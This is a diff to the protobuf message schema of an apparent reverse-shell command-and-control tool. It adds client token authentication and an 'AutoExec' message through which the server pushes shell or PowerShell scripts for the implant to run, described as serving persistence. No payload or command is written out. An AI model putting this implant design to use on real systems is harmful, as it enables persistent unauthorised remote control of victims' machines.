@@ -15,8 +15,8 @@ option go_package = "github.com/nemanjan00/reverse-shell-listener/client/muxpb";
 // with OpenOk/OpenError, then raw PTY bytes flow both ways as Data frames.
 //
 // Directions:
-//   client -> server : Hello, OpenOk, OpenError, Data, Close, Pong, Ping
-//   server -> client : OpenRequest, Data, Resize, Close, Ping, Pong
+//   client -> server : Hello, OpenOk, OpenError, Data, Close, Pong, Ping, AutoExecResult
+//   server -> client : OpenRequest, Data, Resize, Close, Ping, Pong, AutoExec
 
 message Frame {
   oneof kind {
@@ -29,11 +29,14 @@ message Frame {
     Close       close        = 7;  // both: a channel ended / please end it
     Ping        ping         = 8;  // both: keepalive
     Pong        pong         = 9;  // both: keepalive reply
+    AutoExec    auto_exec    = 10; // server -> client: run this script locally
   }
 }
 
 // Sent once, immediately after the socket opens, so the operator sees who
-// called home.
+// called home. The token field authenticates the client against the server's
+// BUILD_TOKEN (the same token used by the /dl download endpoint); a missing
+// or mismatched token causes the server to close the connection.
 message Hello {
   string hostname = 1;
   string username = 2;
@@ -41,6 +44,7 @@ message Hello {
   string arch     = 4;  // runtime.GOARCH
   uint32 version  = 5;  // protocol version (see PROTO_VERSION)
   string tags     = 6;  // free-form label the operator can set on the implant
+  string token    = 7;  // BUILD_TOKEN; server rejects the connection if it mismatches
 }
 
 // Server asks the client to spawn a new shell channel.
@@ -83,3 +87,14 @@ message Close {
 
 message Ping { uint64 nonce = 1; }
 message Pong { uint64 nonce = 1; }
+
+// Server -> client: a script the client should execute locally right after
+// Hello. The server picks the file based on the client's reported os: it
+// reads autoexec/<os>.sh (or autoexec/<os>.ps1 for windows) from the autoexec
+// directory and sends the contents here. Used for persistence / setup without
+// hardcoding commands in the implant binary.
+message AutoExec {
+  string os      = 1;  // the os the server matched on (informational)
+  string shell   = 2;  // "sh" or "powershell" — how to invoke the script
+  bytes  script  = 3;  // the script body to execute
+}
